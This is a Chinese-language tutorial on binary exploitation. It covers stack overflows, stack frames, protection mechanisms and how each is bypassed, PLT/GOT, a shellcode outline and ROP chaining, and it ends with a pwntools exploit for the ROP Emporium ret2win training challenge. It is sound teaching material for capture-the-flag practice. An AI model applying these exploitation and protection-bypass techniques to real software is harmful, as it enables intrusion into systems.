## 0. 先破除恐惧

很多人觉得二进制很难。其实**第一关只需要理解一件事**：

> 程序把用户输入存进一块**固定大小的内存**，如果你输入得比它长，
> 多出来的部分就会**覆盖掉后面的数据**，包括"函数该返回哪里"这个地址。

这就是**栈溢出**。整个 Pwn 领域就是从这句话长出来的。

### 0.1 缓冲区为什么会被"塞爆"？——设计者当初的取舍

先把这件事的来龙去脉讲清楚，你就不会觉得它神秘了。

C 语言诞生在 1970 年代。当时的设计目标是：**贴近硬件、跑得快、把控制权完全交给程序员**。
编译器的哲学是"我信任你"——你声明 `char buf[64]`，编译器就认为你只会往里面放 64 字节，
它**不会**在你每次写入时偷偷插一段"越界检查"。原因非常现实：

| 假如每次都检查边界 | 要付出的代价 |
|---|---|
| 每条写内存的指令后面都要比对长度 | 程序变慢（当年的机器慢得可怕） |
| 数组长度必须存到运行时 | 每个数组多占内存，函数还得额外传长度 |
| 编译器要能算出"这块内存到底多大" | 指针可能来自 malloc / 栈 / 全局，编译器根本分不清 |

所以 C 的约定是：**边界是程序员的责任**。一旦程序员忘了检查（或者用了下面这些"自己
不管长度"的函数），多出来的字节就会顺着内存往下爬，把邻居的数据踩坏。

> 一句话记住：**栈溢出不是"系统有 bug"，而是"程序自己把边界算错了"**。
> 攻击者做的事，只是利用这个错误，并且特意把踩坏的位置选在"返回地址"上。

至于为什么偏偏是 `gets` 这类函数最危险，看它们"有没有长度参数"就懂了：

| 函数 | 有没有长度参数 | 后果 |
|---|---|---|
| `gets(buf)` | 没有 | 读到换行为止，**给多少收多少** |
| `strcpy(dst, src)` | 没有 | 照抄到 `src` 的 `\x00` 为止，多长都抄 |
| `sprintf(buf, fmt, ...)` | 没有 | 格式化出来多长就写多长 |
| `fgets(buf, 64, stdin)` | 有 | 最多读 63 字节，安全的替代品 |
| `strncpy(dst, src, n)` | 有 | 最多抄 n 字节 |
| `snprintf(buf, n, fmt, ...)` | 有 | 最多写 n 字节 |

所以现代代码一律用 `fgets` / `snprintf`。ROP Emporium 之类的教学题故意保留
`gets` / `read`，就是为了把"漏洞"亲手送到你手里，让你练怎么利用它。

### 0.2 一次函数调用，栈上到底发生了什么？

先看一个**完全正常**的函数调用：

```c
void win() { /* 干点活 */ }
int main() { win(); }
```

```
① call win 之前                     ② call 指令执行时
   ┌──────────────┐                    ┌──────────────┐
   │ main 的局部量 │                    │ main 的局部量 │
   ├──────────────┤                    ├──────────────┤
   │    ......    │                    │    ......     │
   ├──────────────┤ ← RSP              ├──────────────┤
   │              │                    │  返回地址     │ ← RSP 又往下移 8 字节
   └──────────────┘                    ├──────────────┤
                                       │ main 的局部量 │
                                       └──────────────┘
                                       RIP ← win 的入口地址

③ win 的序言（prologue）             ④ win 的结尾（epilogue）
   push rbp        ← 保存旧的栈底       leave  = mov rsp,rbp; pop rbp
   mov rbp, rsp    ← 确立新栈底         ret    = pop rip  ← 关键！
   sub rsp, 0x40   ← 给局部变量腾地方

   ┌──────────────┐                    ┌──────────────┐
   │ 旧 rbp        │ ← 这就是 saved RBP │ 旧 rbp        │ ← pop 回 RBP
   ├──────────────┤                    ├──────────────┤
   │ 返回地址      │                    │ 返回地址      │ ← 弹给 RIP，回到 main
   ├──────────────┤ ← RBP              ├──────────────┤
   │ win 的局部变量│ ← RSP              │              │
   └──────────────┘                    └──────────────┘
```

所谓"栈帧"，其实就是**栈上一段连续的内存**。一个正在执行的函数，视野是这样：

```
高地址
┌─────────────────────┐
│  调用者的局部变量     │
├─────────────────────┤ ← RBP（当前函数栈底）
│  saved RBP（8 字节） │  ← 函数返回时要用它恢复调用者的栈
├─────────────────────┤
│  return address     │  ← 攻击者的最终目标：改掉它
├─────────────────────┤
│  局部变量 buf[64]    │  ← 我们输入的起点
├─────────────────────┤ ← RSP（当前函数栈顶）
│   ...... 更低地址    │
└─────────────────────┘
低地址
```

请注意一个反直觉的事实：**局部变量在低地址，返回地址在它"上面"（高地址）**。
所以"往 `buf` 里多写"是往上爬，爬的顺序正好是：先碰到 saved RBP，再碰到返回地址。
这个顺序不是巧合，而是 `push rbp` / `sub rsp` 这套固定动作决定的。

### 0.3 输入越来越长时，内存里到底发生了什么

以 `char buf[64]`、偏移 72 为例（64 字节 buf + 8 字节 saved RBP = 72），
送入不同长度的输入，效果完全不同：

| 输入长度 | 覆盖范围 | 结果 |
|---|---|---|
| ≤ 63 | 完全在 buf 里（还得留一个字节给结尾的 `\x00`） | 正常，没碰到任何邻居 |
| 64 | 字符刚好写满 buf，但 `gets` 还会补一个 `\x00` | 越界 1 字节，多数情况下"看不出问题"，最难察觉 |
| 65–71 | 开始啃 saved RBP | 返回时 RBP 是垃圾，**通常还能跑完**，最难察觉 |
| 72 | 刚好摸到返回地址第 1 个字节 | 返回地址被改掉 1 字节，跳到奇怪地方 |
| 73–79 | 部分覆盖返回地址 | 崩溃地址和你输入的内容"有亲缘关系" |
| 80 | 返回地址 8 字节**全部**被自己控制 | **完全劫持 RIP，目标达成** |
| > 80 | 继续往上，踩调用者的栈帧 | 崩得更早、更乱，甚至报别的错 |

"返回地址 8 个字节全部被控制"就是我们要抓住的那一刻：

```python
payload = b'A' * 72 + p64(目标地址)
#                     └── 这 8 个字节会原封不动地变成新的 RIP
```

**为什么必须用 `p64`（小端打包），不能直接写字符串？**

因为 x86-64 是**小端序（little-endian）**：内存中低地址存放的是地址的低位字节。

```
目标地址 0x00000000004007a7

你脑子里的书写顺序： 00 00 00 00 00 40 07 a7
内存里的真实顺序：   a7 07 40 00 00 00 00 00
                     ↑ 低地址方向
```

所以 `p64(0x4007a7)` 等于 `b'\xa7\x07\x40\x00\x00\x00\x00\x00'`，整整 8 字节。
如果目标地址里含有 `\x00`（几乎总是有），用 `sendline` 发出去没问题；
但在这之后如果程序又走了一次字符串处理函数（`strcpy`、`strlen` 之类），
`\x00` 会把它后面的所有字节**全部截断**——这也是初学者最迷惑的现象之一：
"我明明把 payload 发出去了，怎么到一半就被吃掉了？"

### 0.4 第一次写 exploit，最容易挂在哪儿

| 坑 | 现象 | 原因 / 解决 |
|---|---|---|
| 偏移多算或少算 8 | 崩溃地址像 `0x414141414141`，或跳到错误的地方 | 64 位下 **saved RBP 占 8 字节**，别漏；32 位只有 4 字节 |
| 忘了小端序 | 明明填了正确地址，却跳到 `0xa7074000...` | 一律用 `p64()` / `p32()`，别自己拼字节串 |
| `'A'` 少了 `b` 前缀 | Python 3 报 `TypeError: can only concatenate str (not "bytes") to str` | pwntools 只吃 `bytes`，字面量全部写成 `b'A'` |
| 填充里混进 `\n` | 偏移算出来怪怪的，或者提前结束输入 | 填充字符用 `b'A'`/`b'B'` 这类安全字节 |
| 没关 ASLR | gdb 里每次地址都不一样，算不出基址 | `echo 0 > /proc/sys/kernel/randomize_va_space`（容器内可关；gdb 默认已关随机化） |
| 用 `send` 而不是 `sendlineafter` | 输入被前面的菜单读走，程序"没反应" | 先对上提示符：`io.sendlineafter(b'> ', payload)` |
| 本地通了远程挂了 | 本地 flag 能读，远程是空输出 | 远程环境/路径不同，确认目标文件路径与 libc 版本 |

## 1. 基础概念（必读）

### 1.1 内存布局

```
高地址
┌─────────────┐
│    栈 Stack │  ← 局部变量、函数返回地址（向下增长）
├─────────────┤
│      ↓      │
│      ↑      │
├─────────────┤
│   堆 Heap   │  ← malloc 分配（向上增长）
├─────────────┤
│  BSS / Data │  ← 全局变量
├─────────────┤
│  Text/Code  │  ← 程序指令（只读）
└─────────────┘
低地址
```

这张图是整章的地基，值得多花十分钟把它看透。**为什么要有这么多段？** 因为不同数据
的需求压根不一样：

| 段 | 里面放什么 | 读写权限 | 为什么这么设计 |
|---|---|---|---|
| **Text/Code** | 机器指令 | 只读 + 可执行 | 谁敢改指令谁就能控制程序，所以设成只读（这就是 NX 的雏形） |
| **Data** | 已初始化的全局/静态变量 | 读写 | 编译时就确定初始值，能写进文件、不用运行时赋值 |
| **BSS** | 未初始化的全局/静态变量 | 读写 | 全零，没必要占磁盘空间，加载时直接划一块清零 |
| **Heap** | `malloc` / `new` 出来的 | 读写 | 大小运行时才定，必须能动态伸缩 |
| **Stack** | 局部变量、参数、返回地址 | 读写 | 函数一进来就要用，越快越好，用栈指针一挪就有 |

**"向下增长"是什么意思？** 不是越用越高，而是**新的栈帧往低地址方向堆**：

```
void a() { b(); }         栈里的实际排布
void b() { c(); }
void c() { /* 这里出错 */
}
```

```
高地址
┌──────────────────┐
│  main 的栈帧      │  ← 最先进入，占据最高处
├──────────────────┤
│  a() 的栈帧       │
├──────────────────┤
│  b() 的栈帧       │
├──────────────────┤
│  c() 的栈帧       │  ← 最后进入，位置最低
├──────────────────┤ ← RSP 当前栈顶
│                  │
└──────────────────┘
低地址              ↑ 再调用新函数，继续往这个方向长
```

所以"栈溢出往上爬（覆盖返回地址）"和"栈向下增长"两者不矛盾：
**栈帧是向下堆叠的，但在一个栈帧内部，从局部变量到返回地址是往上排的。**

**栈和堆为什么从两头往中间长？** 这是有意为之的"共享空间"策略：谁用得多谁就多占，
中间那段空白按需分配。这样一来，栈能开多大、堆能开多大都不需要预先划死。
不过也带来一个历史后果——两者一旦在中间相遇，就是所谓的"栈堆相撞"（实战中极少遇到，
当段子听就行）。

**关于 ASLR：** 现代系统里这三张图都不是固定的。Text/Heap/Stack/libc 的基址每次运行
都可能变（这就是地址随机化）。所以先记住"**布局是相对的、地址是会变的**"，
后面讲 PIE / ASLR / 泄露时你会反复用到这个认识。

### 1.2 关键寄存器（x86-64）

| 寄存器 | 作用 | 渗透中的意义 |
|---|---|---|
| `RIP` | 下一条要执行的指令地址 | **控制它 = 控制程序** |
| `RSP` | 栈顶指针 | 栈溢出的位置 |
| `RBP` | 栈底指针 | 定位局部变量 |
| `RDI/RSI/RDX` | 函数第 1/2/3 个参数 | ROP 要控制它们 |
| `RAX` | 返回值 | 常用来传值 |

**函数调用的参数顺序**（x86-64）：`RDI`, `RSI`, `RDX`, `RCX`, `R8`, `R9`，之后才用栈。

**为什么一半参数走寄存器、一半走栈？** 这是 x86-64 相对 32 位最大的改动之一。
32 位时代参数**全部**压栈，每次调用都是一次内存读写，慢。64 位改成了"前 6 个塞寄存器"：

```
32 位老规矩                          64 位新规矩
call f(a, b, c, d)                   call f(a, b, c, d)

高 ┌──────────┐                        RDI = a      ← 第 1 个参数
   │    d     │                        RSI = b      ← 第 2 个参数
   ├──────────┤                        RDX = c      ← 第 3 个参数
   │    c     │                        RCX = d      ← 第 4 个参数
   ├──────────┤                        R8  = 第 5 个
   │    b     │                        R9  = 第 6 个
   ├──────────┤                        第 7 个及以后才压栈（从右往左）
   │    a     │
   ├──────────┤
   │ 返回地址  │
低 └──────────┘                        好处：调用/返回都不用动内存，快得多
```

**这件事对 Pwn 意味着什么？** 意义极大。想调用 `system("/bin/sh")`，你不需要真的
把参数"压栈"，只需要**让 RDI 等于那个字符串的地址**，然后跳进 `system` 就完事了。
这正是 `pop rdi; ret` 这个 gadget 值钱的原因——它是控制 RDI 最省事的办法。

**顺便记住几个"配角"寄存器，看反汇编时经常撞见：**

| 寄存器 | 说明 |
|---|---|
| `RAX` | 返回值；`syscall` 里还兼做**系统调用号**（比如 `59` = execve） |
| `RDX` | 第 3 个参数；在 `write`/`read` 里常是"长度" |
| `RCX` | 第 4 个参数；`syscall` 会顺手把它设成返回地址 |
| `R8 / R9` | 第 5、6 个参数 |
| `RSP / RBP` | 栈顶 / 栈底，函数序言和结尾必动 |
| `RIP` | 唯一一个不允许直接 `mov` 改的寄存器（只能靠 `call`/`ret`/`jmp` 之类改变） |

**为什么 RIP 不能直接赋值？** 因为它每取一条指令就自动 +1，是"当前进度条"。
如果你能随手 `mov rip, xxx`，CPU 流水线就完全无法预测。所以设计上只能通过
受控的跳转指令改变它——而 `ret` 恰好就是一个"从栈里读出地址并跳过去"的指令。
**这就是所有 ROP 攻击的立足点：栈里的内容决定了程序去哪。**

**栈对齐（16 字节）**：还有一条纪律要背下来。x86-64 的 ABI 规定，**执行 `call` 指令的那一刻，
RSP 必须是 16 的倍数**。所以：

```
函数入口处的 RSP ≡ 8  (mod 16)   ← 因为 call 已经压了 8 字节返回地址
                          ↓
      函数自己再 push rbp / sub rsp 把它调回 16 的倍数
```

为什么要有这条规矩？因为 SSE 指令（`movaps` 之类）要一次搬 16 字节，
如果地址没对齐会直接抛 `SIGSEGV`。而 glibc 内部大量使用 SSE——
所以**栈一旦没对齐，崩的地方常常离你的 gadget 很远**，报错信息也看不出病因。
这就是关卡 3 要在链首塞一个 `ret` 的原因。

### 1.3 栈溢出的样子

```c
void vulnerable() {
    char buf[64];        // 只有 64 字节
    gets(buf);           // 无长度检查！可以无限输入
}
```

```
栈内布局（从低到高）：
┌────────────┬────────────┬──────────────┐
│ buf[64]    │ saved RBP  │ return addr  │
└────────────┴────────────┴──────────────┘
   ↑ 我们填这里            ↑ 覆盖这里！
```

**偏移量计算**：64 (buf) + 8 (saved RBP) = **72 字节**后就是返回地址。

**把这段代码编译后，CPU 实际做了这些事（带注释的汇编）：**

```asm
vulnerable:
    push   rbp              ; 把调用者的栈底存起来 → 又多占 8 字节
    mov    rbp, rsp         ; 让 rbp 指向这一帧的"底"
    sub    rsp, 0x40        ; 腾出 0x40 = 64 字节给 buf  ← 64 就是这么来的
    lea    rax, [rbp-0x40]  ; rax = buf 的首地址（在 rbp 下面 64 字节处）
    mov    rdi, rax         ; 第 1 个参数 = buf
    call   gets             ; gets(buf)  ← 灾难现场
    nop
    leave                   ; mov rsp,rbp ; pop rbp   ← 把 rbp 弹掉，rsp 指向返回地址
    ret                     ; pop rip                  ← 从栈里取出返回地址，跳过去
```

**看明白了吗？** `sub rsp, 0x40` 决定了缓冲区大小，`push rbp` 决定了 saved RBP 那 8 字节。
所以偏移量的公式可以死记：

```
偏移 = 局部变量总大小 + 8（64 位下的 saved RBP）
     = 0x40 + 8
     = 72
```

**同一份 C 代码，在不同编译选项下偏移可能不同**，这是初学者最常踩的坑：

| 编译选项 | 影响 |
|---|---|
| 开了 `-O2` | 编译器可能把 buf 内联/挪位置，甚至把 `gets` 换成别的，偏移大变 |
| 加了 canary | 栈里多 8 字节 canary（有的还把 rbp 位置换掉），偏移 +8 |
| 32 位编译 | saved RBP 只有 4 字节 |
| 局部变量更多 | 每个变量都在 buf 和 rbp 之间挤位置，顺序由编译器定 |

**所以永远不要"看源码猜偏移"，要用 cyclic 实测**（下面 3.1 会完整演示）。
源码只是给你一个数量级的感觉。

**参数与局部变量的排列顺序**：注意上面对齐细节。`char buf[64]` 可能并不正好从
`rbp-0x40` 开始，编译器可能会为了对齐多留一点空。真实偏移以 cyclic 实测为准：

```
rbp-0x50  ┌──────────────┐
          │  其他局部变量  │
rbp-0x40  ├──────────────┤ ← buf 开始（或按对齐调整）
          │    buf[64]    │
rbp+0x00  ├──────────────┤ ← rbp
          │  saved RBP    │
rbp+0x08  ├──────────────┤
          │ return addr   │ ← 我们的目标
rbp+0x10  └──────────────┘
```

### 1.4 保护机制（checksec）

| 保护 | 作用 | 绕过思路 |
|---|---|---|
| **NX** | 栈不可执行 | 用 ROP（复用已有代码） |
| **Canary** | 栈保护金丝雀 | 泄露 canary 后带上 |
| **PIE** | 地址随机化 | 泄露地址算基址 |
| **ASLR** | 系统级随机化 | 同上 |
| **RELRO** | GOT 表只读 | Full RELRO 无法改 GOT |

```bash
# 检查一个程序的保护
checksec --file=./vuln
# 或
pwn checksec ./vuln
```

**逐个拆开讲——每一项都是在和某个具体攻击手法对着干：**

**① NX（No-eXecute，也叫 DEP）——让栈"能读能写但不能执行"**

历史上最早的攻击很粗暴：往栈上写一段 shellcode，然后把返回地址指过去执行。
于是防御方的思路是：栈本来就是放数据的，凭什么当代码跑？给内存打上"不可执行"标记就好了。

```
NX 关闭时：                     NX 开启时：
┌────────────┐                  ┌────────────┐
│ [rsp]      │ 读写 ✔           │ [rsp]      │ 读写 ✔
│  …shellcode│ 执行 ✔ ← 攻击者最爱的门 │ …shellcode │ 执行 ✘ ← 被 CPU 直接拦下
└────────────┘                  └────────────┘
```

NX 开启后你**不能再"把代码写进去执行"**，但可以**"跳到已有的代码上执行"**——
程序自己的 `.text` 段是可执行的，里面的指令也够你用。这条路就是 **ROP**。
所以 NX 并没有消灭攻击，只是把"自己写代码"逼成了"借用别人的代码"。

**② Canary（金丝雀）——在返回地址前放一个"哨兵值"**

命名来自矿井里的金丝雀：矿工带它下井，鸟一死就说明有毒气。函数序言里塞一个随机值，
返回前检查它有没有被改动过：

```
高地址
┌──────────────────┐
│  return addr     │
├──────────────────┤
│  saved RBP       │
├──────────────────┤
│  canary (8 字节) │ ← 每次程序启动随机生成，最后一个字节固定是 \x00
├──────────────────┤
│  buf[64]         │ ← 我们覆盖的时候必然先踩到 canary
└──────────────────┘
低地址
```

```
正常返回：  canary 没变 → 继续
被溢出后：  canary 变了 → __stack_chk_fail() → 程序 abort

$ ./vuln
*** stack smashing detected ***: terminated
Aborted (core dumped)
```

看到这行 `*** stack smashing detected ***` 就知道：**canary 生效了，你踩到哨兵了。**
绕过思路只有一条："先读出来、再原样填回去"。常见读法：

| 手法 | 说明 |
|---|---|
| 格式化字符串 `%p` | 直接打印出栈上内容，一次漏一堆（含 canary） |
| `puts` / `write` 泄露 | 溢出到 `\x00` 之前的位置，配合额外输出函数把 buf 打回来 |
| 逐字节爆破 | fork server 型程序（如 pwnable.tw 的部分题）canary 每进程相同，可一个字节一个字节撞 |

补充一个细节：canary 的**最低字节固定是 `\x00`**。因为字符串函数会在 `\x00` 处停住，
这样就挡住了一部分"顺手覆盖"的溢出。所以如果泄露时读到 7 字节加一个 `\x00`，
把它补回去即可：`canary = leaked.ljust(8, b'\x00')`。

**③ PIE + ASLR——把"地址"本身变成秘密**

- **ASLR** 是操作系统层面的：程序一加载，栈、堆、libc 的基址就随机偏移。
- **PIE** 是程序自身的编译选项：连程序自己的 `.text` 段也一起随机化。
- **不开 PIE 时，代码地址是固定的**（比如永远从 `0x400000` 附近开始），
  这才让 `0x4007a7` 这种硬编码地址能在本地和远程都管用——ROP Emporium 大部分关卡
  就是 No PIE，专门方便你入门。
- 开了 PIE 后，你手里所有 gadget / 函数地址都是"相对偏移"，必须先**泄露一个真实地址**
  才能算出基址：

```
真实地址 = 泄露到的地址
基址     = 真实地址 - 该符号在文件中的偏移
任意地址 = 基址 + 任意符号的偏移
```

**常见误解：PIE 和 ASLR 是一回事吗？** 不是。ASLR 关掉，PIE 开启的程序，
每次运行**自身基址仍然会变**（因为 PIE 依赖内核随机化支持，关掉总开关则不会变，
但两者机制层面是两个东西）。看 `checksec` 输出最直接：

| checksec 显示 | 含义 |
|---|---|
| `PIE: No PIE` | 代码地址固定，可以硬编码 |
| `PIE: PIE enabled` | 基址随机，需要泄露才能计算 |
| `ASLR` | 系统级开关，用 `cat /proc/sys/kernel/randomize_va_space` 看（2 = 全开） |

**④ RELRO（Relocation Read-Only）——让 GOT 表不再"可写"**

GOT（全局偏移表）是"函数真实地址的存放处"。程序第一次调用某个 libc 函数时，
动态链接器会把真实地址填进 GOT（这叫**延迟绑定**）。填好之后 GOT 就是一张
**写满了函数地址的表**。

既然它可写，攻击者就能"把 GOT 里某函数地址改成 `system` 地址"，
下次程序调用那个函数时，实际跳到 `system`——这就是 **GOT 劫持**。

RELRO 的三档就是在堵这个洞：

| 档位 | 做什么 | 你还能做什么 |
|---|---|---|
| **No RELRO** | 什么都不做，GOT 完全可写 | 随便改 GOT |
| **Partial RELRO** | 把 `.got.plt` 和 `.plt` 的相对顺序调开（`.got.plt` 仍在可写段） | 仍可写 GOT，但 `ret2dlresolve` 之类变难 |
| **Full RELRO** | 启动时**一次性**把所有符号全部解析完，然后把整张 GOT 设成只读 | GOT 改不了，只能换思路（ROP 调 libc、`__free_hook` 等） |

看 `checksec` 输出的对应关系：

```
RELRO: Full RELRO     → GOT 是只读的，别惦记了
RELRO: Partial RELRO  → GOT 可写，最常见的"可打"状态
RELRO: No RELRO       → 完全敞开
```

**⑤ 再加两个 checksec 里会看到、但原表没提的项**

| 项 | 含义 | 影响 |
|---|---|---|
| **FORTIFY_SOURCE** | 编译期把 `strcpy`/`sprintf` 等换成带长度检查的 `_chk` 版本 | 越界会直接 abort，溢出题更难找 |
| **RPATH/RUNPATH** | 优先从程序自带目录加载 libc | 可用于替换 libc 做环境复现 |
| **Fortified** | 见上；gdb 的 `checksec` 也会显示 cannary/fork 等信息 | 判断要不要先泄露 canary |

**⑥ 五项保护的对照速查表（备考/备查都靠它）**

| 保护 | 防的是什么 | 触发时你看到什么 | 一句话绕过思路 |
|---|---|---|---|
| NX | 执行栈上数据 | 栈上 shellcode 直接段错误 | 改用 ROP |
| Canary | 覆盖返回地址 | `stack smashing detected` | 泄露 canary 再带上 |
| PIE | 硬编码代码地址 | 每次地址都不一样 | 泄露一个地址算基址 |
| ASLR | 硬编码 libc/栈/堆地址 | 地址随机 | 先泄露再计算 |
| Full RELRO | 改 GOT 表 | 写 GOT 时崩溃 | 改打 libc hook / 纯 ROP |
| FORTIFY | 无长度检查的库函数 | 直接 abort | 找别的入口，或利用返回值 |

**⑦ 一句话记法（考场版）**

> **NX 拦"自己写代码"，Canary 拦"不知不觉踩过去"，PIE/ASLR 拦"提前算好地址"，
> RELRO 拦"偷改函数地址"。** 四种保护分别对应四种绕过研究，学 Pwn 的顺序基本就是它们。

### 2.2 动态链接怎么工作：PLT 与 GOT（本章最重要的原理之一）

程序自己不可能实现 `printf`，那是 libc 的事。可 libc 加载到哪、什么时候加载，
编译期都不知道。于是有了 **PLT / GOT 这对搭档**来"晚了再说"：

```
调用 printf 时，你实际调用的不是 libc 的 printf
   你 ──call──► printf@plt ──jmp [printf@got]──► libc 里的 printf
                    ↑               ↑
                 一段跳板        存放真实地址的格子
```

**完整过程分两次看（延迟绑定）：**

```
【第一次调用 printf】真实地址还没解析

  main → call printf@plt
           │
           ▼
  printf@plt:
      jmp  qword [printf@got]   ← 此时 GOT 里存的还是"下一行"的地址
      push 符号索引              ← 所以会落回这里
      jmp  PLT0（动态链接器入口）← 请求链接器去解析 printf
           │
           ▼
  动态链接器 dl_runtime_resolve 找到 printf 真实地址
           │
           ▼
  把真实地址写回 printf@got        ← 从此 GOT 里就是真地址了
           │
           ▼
  跳到 printf 执行

【第二次以后的调用】GOT 已填好

  main → call printf@plt
           ▼
  printf@plt: jmp qword [printf@got] → 直接跳到 libc 的 printf   ← 一步到位，极快
```

**为什么要这么绕？** 因为"每次启动都一次性解析成百上千个函数"太慢（大部分程序根本
用不到那么多函数）。延迟绑定把解析推迟到"第一次真的要用"，省时间。

**这件事同时给了攻击者两件礼物：**

1. **GOT 是可写的**（Partial RELRO 下）→ 可以把它改成别的函数地址（GOT 劫持）。
2. **GOT 里存的是 libc 的真实地址** → 你可以"读"它来算 libc 基址（这就是 `ret2libc`
   泄露 `puts@got` 的原理）。

**PLT vs GOT 对照表（最容易混的一对概念）：**

| 对比项 | PLT（Procedure Linkage Table） | GOT（Global Offset Table） |
|---|---|---|
| 存在哪 | 程序自己的 `.plt` 段 | `.got` / `.got.plt` 段 |
| 里面存什么 | **代码**（一小段跳转指令） | **地址**（libc 函数的真实地址） |
| 大小 | 每个外部函数固定 16 字节 | 每个外部函数 8 字节 |
| 会变吗 | 不变（始终是那段跳板代码） | **会变**（第一次调用后被写入真实地址） |
| 攻击视角 | `system@plt` 是"可以直接跳过去用的入口" | `puts@got` 是"可以读出来泄露地址的窗口"、"可以改写的开关" |
| 记忆口诀 | **PLT 是"门"，去哪个函数从这走** | **GOT 是"地址簿"，写着每个函数住在哪** |

**为什么 `split` 关卡里写的是 `system@plt` 而不是 libc 里的 `system`？**
因为 No PIE 下 PLT 地址固定、可以直接硬编码；而 libc 地址每次运行都变（ASLR），
不泄露就写不出来。有 `@plt` 可用时，它是最省事的选择。

### 2.3 三段代码的"分工"：一段 shellcode 怎么写（概念版）

ROP 是主流，但理解 shellcode 有助于理解 `pwnable.tw start` 这类题。核心就三件事：

```
① 拿到一个可执行的内存区域（或者退而求其次，用 ROP 调系统调用）
② 让 RSP/RDI 指向 "/bin/sh" 字符串
③ 执行 execve("/bin/sh", 0, 0)

execve 系统调用号 = 59 (x86-64)
  RAX = 59
  RDI = "/bin/sh" 地址
  RSI = 0
  RDX = 0
  syscall
```

```
内存里大概长这样：
┌────────────────────────────┐
│ ...shellcode 指令...        │
│ mov rax, 59                │
│ lea rdi, [rip+binsh]       │
│ xor rsi, rsi               │
│ xor rdx, rdx               │
│ syscall                    │
│ "/bin/sh\0"  ← 紧跟在后面   │
└────────────────────────────┘
```

**为什么有些题要"手工拼 shellcode"？** 因为题目只给你几个字节的输入空间
（`pwnable.tw start` 就是典型），你写不下完整的 `execve` 代码。这时候就用一个小技巧：
先写一段极短的代码，让它**再 `read` 一段长输入进来**，然后跳到新读进来的地方执行。
这叫 shellcode 的"两段式"写法。

### 3.0 开始之前：ROP 到底是怎么"连起来"的？

这 8 关会越来越绕，但底层机制**从头到尾只有一条**。先把它钉死，后面就都不慌了。

**核心机关就是 `ret` 这条指令的两件事：**

```
ret  =  pop rip
        ┌──────────────────────────┐
        │ ① 从 [RSP] 读 8 字节      │
        │ ② 把它送进 RIP（跳过去）   │
        │ ③ RSP += 8（栈顶抬高）     │
        └──────────────────────────┘
```

看到关键了吗？**`ret` 会消费栈上 8 字节，然后跳到那个地址。** 而跳过去的地址
如果又恰好以 `ret` 结尾（gadget 都是这样的），它执行完又会**再消费栈上 8 字节**。

**于是"栈"就变成了一条指令流水线：**

```
栈内存（低地址 → 高地址）：
┌──────────────┬──────────────┬──────────────┬──────────────┐
│  gadget1地址  │ 参数A        │  gadget2地址  │  函数F地址    │
└──────────────┴──────────────┴──────────────┴──────────────┘
      ↑ RSP

执行过程：
  ret                 → 跳到 gadget1，RSP 指向"参数A"
  gadget1 执行         → 比如 pop rdi; ret，把参数A 吃进 RDI，RSP 指向 gadget2
  gadget1 的 ret      → 跳到 gadget2，RSP 指向 函数F
  gadget2 执行         → …
  ...
  最后 ret            → 跳到想要的函数，参数已经在寄存器里就位 ✔
```

**所以 ROP 链的本质是："你写进栈里的 8 字节格子，一格一格被 `ret` 吃掉当作指令地址。"**
栈上每一个 `p64(...)` 就是一格。你排布的**顺序**，就是程序的**执行顺序**。

**对照着看，栈溢出的三种用法是同一件事的三种深度：**

| 层次 | 栈上写了什么 | 效果 |
|---|---|---|
| 最原始 | `b'A'*72 + p64(某个函数)` | 直接跳过去（关卡 1） |
| 加参数 | `... + p64(pop_rdi) + p64(参数) + p64(函数)` | 给函数带参数（关卡 2） |
| 多功能 | 上面那组重复 N 次 | 连续调用一串函数（关卡 3） |

**为什么必须找一个"以 `ret` 结尾"的 gadget？** 因为这样它执行完才会继续"吃"你的下一格。
如果一段指令以 `jmp` 或 `call` 结尾，执行流就跑到别处去了，你的链就断了。
所以 `ROPgadget` 给出的每一条，结尾必然是 `ret`（或 `syscall; ret` 这种等价形式）。

**"gadget" 为什么会有这么多？** 因为它们**不是专门写给你用的**——它们是编译器生成的
正常指令序列，"恰好"能在中间某个字节开始解释成有用的指令，又"恰好"以 `ret` 结束。
一句话：**gadget 是既有代码的副产品，不是设计出来的。**
这也是 ROP 的精髓：你不需要注入代码，只需要在已有的代码里"重新排列组合"。

### 关卡 1：ret2win（最简单的开始）

**目标**：程序里有个 `ret2win()` 函数会打印 flag，但没被调用。你要**覆盖返回地址跳过去**。

```bash

# 输出：0x004007a7 sym.ret2win

# 找溢出偏移：用 pattern

gdb ./ret2win

  # 崩溃后
  (gdb) info registers rip
  # 用崩溃的 rip 值反查偏移：
  (gdb) p cyclic_find(0x6161616161616166)
```

**exploit.py**：

```python
from pwn import *

context(arch='amd64', os='linux', log_level='info')
io = process('./ret2win')          # 本地
# io = remote('TARGET', 1337)      # 远程

OFFSET = 40                        # 用 cyclic_find 得到的偏移
RET2WIN = 0x4007a7                 # ret2win 函数地址

payload = b'A' * OFFSET + p64(RET2WIN)
io.sendlineafter(b'> ', payload)
io.interactive()
```

**知识点**：`cyclic` 生成唯一模式 → 崩溃地址反查偏移 → 覆盖返回地址。

**为什么 `cyclic` 能精确定位偏移？（这一步的原理解开，后面所有题都省事）**

`cyclic(n)` 生成的不是随机垃圾，而是一串**穷举所有 4 字节组合、保证不重复**的模式。
pwntools 的构造方式大致是：4 个字符一组，按字母表顺序枚举，比如
`aaaabaaacaaadaaa...`。它保证了**任意长度 ≥ 4 的连续子串在整个串里只出现一次**。

于是就有了这个漂亮的对应关系：

```
你填进 buf 的：  aaaabaaacaaadaaa...（一串不重复的 4 字节组合）
                 ↓ 溢出，覆盖了返回地址那 8 字节
返回地址被写成： 0x6161616161616166   ← 66 是字母 f，反着看就是 "...faaaaaa"
                 ↓ cyclic_find 拿这 8 字节去模式串里查位置
查到的位置 = 40   →  偏移就是 40  ✔
```

**为什么不是 8 字节一起用？** 因为 `cyclic_find` 实际只需要匹配 4 字节就足够唯一
（4 字节足以定位），但它会给出"这段模式从第几个字节开始"的答案——那个下标
就是"返回地址被覆盖的起始偏移"。

**手工算一遍，验证原理（不用 gdb 也能推）：**

```
模式串下标:  0    1    2    3    4    ...
             a    a    a    a    b    ...
若崩溃地址是 0x6161616161616166
  小端还原成字节顺序：66 61 61 61 → "faaa"
  "faaa" 第一次出现在模式串的下标 = 偏移量
```

**崩溃现场怎么读才不白跑一趟？** 一次 `run` 能拿到三样东西，各有用处：

| 命令 | 输出 | 说明 |
|---|---|---|
| `info registers rip` | `rip  0x6161616161616166` | 被覆盖的返回地址，反查偏移用 |
| `info registers rsp` | 栈顶地址 | 确认有没有被带偏 |
| `x/20xg $rsp` | 栈上 20 个 8 字节 | 看你的偏移算得对不对（该是 `0x6161...` 或不含） |
